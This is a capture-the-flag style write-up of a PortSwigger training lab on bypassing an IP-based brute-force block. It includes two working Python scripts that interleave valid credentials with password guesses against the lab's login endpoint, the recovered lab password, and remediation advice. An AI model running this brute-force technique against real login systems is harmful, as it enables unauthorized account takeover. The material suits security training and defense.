# Broken brute-force protection, IP block - PortSwigger Lab 17

**Severity:** Medium
**Target:** https://0aa600b8031b92b7806bd55600e50051.web-security-academy.net

## Summary
The IP block resets after every successful login, allowing an attacker with valid credentials to bypass it and brute-force the victim's account.



## Vulnerability Details
**Type:** Bypassing IP block via valid credential
**Root Cause:** The IP block resets after every valid login
**Endpoint:** https://0aa600b8031b92b7806bd55600e50051.web-security-academy.net/login

## Steps to Reproduce
1. Identify that the IP block resets after a successful login
2. Create an interleaved wordlist alternating valid credentials with brute-force attempts against the victim
3. Run the attack script, which interleaves valid credentials to trigger server-side counter reset before each victim attempt.
4. Identify successful login via 302 redirect with victim's username

## Proof of Concept

script python interleaved wordlist


```python
with open('/home/luweed/Documents/rockpass.txt') as f:
    senhas = f.read().splitlines()
    
with open('/home/luweed/Documents/intercalada.txt', 'w') as f:
    for i, senha in enumerate(senhas):
        if i % 2 == 0:
            f.write('wiener:peter\n')
        f.write(f'carlos:{senha}\n')
```


script python attackline

```python
import requests

with open('/home/luweed/Documents/intercalada.txt') as f:
    pares = f.read().splitlines()
    
for par in pares:
    user, senha = par.split(':')
    r = requests.post(
    	'https://0aa600b8031b92b7806bd55600e50051.web-security-academy.net/login',
    	data={'username': user, 'password': senha},
    	allow_redirects=False
    )
    if r.status_code == 302 and user == 'carlos':
    	print(f'encontrado: {user}:{senha}')
    	break
```



## Result
``carlos:monitor``
<br>
<br>
<img width="1917" height="1044" alt="image" src="https://github.com/user-attachments/assets/8688accf-e97f-49a1-bf0d-d3e7e2713350" />



## Impact

This vulnerability could lead to unauthorized account takeover. Access to the admin panel, data exposure, and the possibility of pivoting.

## Remediation
Implement rate limiting based on account identifier rather than IP address alone. 
Ensure that successful logins do not reset failed attempt counters for other accounts. Consider adding CAPTCHA or exponential backoff after repeated failures regardless of source IP.
